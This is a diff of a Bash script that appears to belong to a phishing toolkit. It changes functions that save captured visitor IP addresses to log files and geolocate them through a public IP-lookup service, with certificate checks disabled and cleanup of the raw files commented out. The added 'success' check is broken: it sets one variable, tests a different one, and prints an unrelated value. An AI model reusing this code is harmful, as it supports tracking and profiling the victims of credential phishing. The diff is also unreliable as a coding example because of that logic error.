@@ -811,17 +811,25 @@ save_ip() {
 	cat .server/dumps/line.txt >> ${log_name}.txt
 	cat .server/www/ip.txt >> ${log_name}.txt
 	mv ${log_name}.txt logs
+	echo -ne " "
 	echo -ne "\n${BLUE} IP Details Saved in : ${GREEN} /logs/${log_name}.txt"
 	rm -rf .server/www/ip.txt
 }
 ip_details() {
 	IP=$1
-	curl -s -L "http://ipwhois.app/json/$IP" > rawtrack.txt
-	grep -o '"[^"]*"\s*:\s*[^,]*' rawtrack.txt > track.txt
+	echo -ne "${RED}[${WHITE}-${RED}]${GREEN} Trying to fetch details of IP:${BLUE}$1${NC}"
+	wget --no-check-certificate "https://ipwho.is/${IP}" -O rawtrack.txt > /dev/null 2>&1
+##	curl -s -L http://ipwho.is/${IP} > rawtrack.txt
+	sleep 2
+	grep -o '"[^"]*"\s*:\s"*[^,]*' rawtrack.txt > track.txt
 	iptt=$(sed -n 's/"ip"://p' track.txt)
 	if [[ $iptt != "" ]]; then
 		echo -e  "\n${GREEN} Device ip: ${NC} $iptt"
 	fi
+	ipstats=$(sed -n 's/"success"://p' track.txt)
+	if [[ $ipsuccess != "" ]]; then
+                echo -e  "\n${GREEN} IP details capturing: ${NC} $iptt"
+        fi
 	iptype=$(sed -n 's/"type"://p' track.txt)
 	if [[ $iptype != "" ]]; then
 		echo -e "${GREEN} IP type: ${NC} $iptype"
@@ -871,8 +879,8 @@ ip_details() {
 		echo -e "${GREEN} State: ${NC} $region"
 	fi
 	cat track.txt >> "${log_name}.txt"
-	rm -rf track.txt
-	rm -rf rawtrack.txt
+##	rm -rf track.txt
+##	rm -rf rawtrack.txt
 }
 
 ## Get credentials
